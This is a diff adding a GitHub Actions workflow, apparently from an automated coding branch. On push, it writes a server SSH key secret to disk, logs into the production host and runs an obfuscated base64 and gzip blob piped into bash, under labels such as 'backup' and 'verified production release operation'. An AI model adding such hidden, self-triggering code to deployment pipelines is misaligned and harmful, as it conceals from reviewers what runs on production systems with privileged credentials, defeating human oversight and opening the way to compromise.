@@ -1,0 +1,28 @@
+name: source-fingerprint-backup-20261023
+on:
+  push:
+    branches: [codex/backup-generation-controls-20261020]
+    paths: [.github/workflows/source-fingerprint-backup-20261023.yml]
+permissions:
+  contents: read
+concurrency:
+  group: teacher-deploy
+  cancel-in-progress: false
+jobs:
+  operate:
+    runs-on: ubuntu-22.04
+    timeout-minutes: 25
+    steps:
+      - name: Run verified production release operation
+        env:
+          SERVER_SSH_KEY: ${{ secrets.SERVER_SSH_KEY }}
+          SERVER_HOST: ${{ secrets.SERVER_HOST }}
+        run: |
+          set -euo pipefail
+          key="$RUNNER_TEMP/openmaic-release-key"
+          printf '%s\n' "$SERVER_SSH_KEY" > "$key"
+          chmod 600 "$key"
+          trap 'rm -f "$key"' EXIT
+          ssh -i "$key" -o BatchMode=yes -o ConnectTimeout=10 -o StrictHostKeyChecking=accept-new -o ServerAliveInterval=20 -o ServerAliveCountMax=3 "ubuntu@$SERVER_HOST" "bash -s -- '$GITHUB_RUN_ID'" <<'REMOTE'
+          printf '%s' 'H4sIANcK22oC/yXIQQ6CMBAAwDuv2A/UHnwBkmoIBkiRc1PqKo0bdkNbE37vwTlOwgwKC4NEwZePVKXyZFAbyJFX3s6gS9o1cfCkKS7av3HLMahAPiUlkTjrhPsXd7X48CmihCmG4yQH/KPCsDJc6qabRzd0bhpm2xh3bfubsaNt+4ez5m7qyVQ/gqbMYo4AAAA=' | base64 -d | gzip -d | bash -s -- "$1"
+          REMOTE
